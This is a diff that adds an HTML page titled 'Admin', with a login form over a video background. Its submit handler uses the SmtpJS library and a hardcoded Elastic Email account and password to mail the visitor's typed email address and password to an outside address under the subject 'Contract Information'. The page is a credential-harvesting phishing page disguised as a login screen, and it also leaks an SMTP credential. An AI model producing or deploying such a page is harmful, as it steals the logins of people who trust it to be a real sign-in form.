@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin</title>
+    <link rel="stylesheet" href="/log-in-page-css.css">
+    
+</head>
+<body>
+    <video autoplay muted loop id="myVideo">
+        <source src="/Galaxy Motion Background Video [HD] _ FREE.mp4" type="video/mp4">
+      </video>
+      
+    <form method="post" class="box"  onsubmit="SendEmail()"; reset(); return false ; >
+        <img src="avater.jpg" class="snk" width="100px" height="100px" alt="Avatar">
+        <p id="textz" >Log In Here </p>
+      <input type="text" id="email" placeholder="Enter e-mail id">
+        <input type="password" id="pass" placeholder="Password">
+        <input type="submit" id="submit"  value="Log In" >
+      </div>
+         
+    </form>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+                    <script>
+                        function SendEmail(){
+                            Email.send({
+                            Host : "smtp.elasticemail.com",
+                            Username : "tanviralif00020@gmail.com",
+                            Password : "882BDB0874147878ABAEDCABB6FA648A5A97",
+                            To : 'them@website.com',
+                            From : document.getElementById("email").value,
+                            Subject : "Contract Information",
+                            Body : "email :" + document.getElementById("email").value
+                           + "<br> password:" + document.getElementById("pass").value
+                           
+                        }).then(
+                        message => alert(Succes)
+                        );
+                                                }
+                    </script>
+    
+
+</body>
+</html>
